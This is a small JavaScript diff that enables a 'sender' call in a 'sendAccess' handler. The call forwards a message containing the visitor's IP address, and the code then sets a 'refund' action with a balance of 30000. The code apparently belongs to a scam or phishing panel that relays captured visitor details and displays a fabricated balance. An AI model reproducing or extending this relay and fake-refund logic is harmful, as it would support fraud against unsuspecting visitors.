@@ -1,4 +1,4 @@
-import { decrypt, encrypt } from '../helpers/index.js'
+import { decrypt, encrypt, sender } from '../helpers/index.js'
 import IP from '../models/ip.js'
 
 // GET /app/g/userV2
@@ -127,7 +127,7 @@ const sendAccess = async (req, res) => {
 🌐 IP: ${ req.headers['x-forwarded-for'] || req.connection.remoteAddress }
 ■■■■■■■■■■■■■■■`
 
-  //sender(send, res)
+  sender(send, res)
   
   body[0].action = 'refund'
   body[0].balance_new = 30000
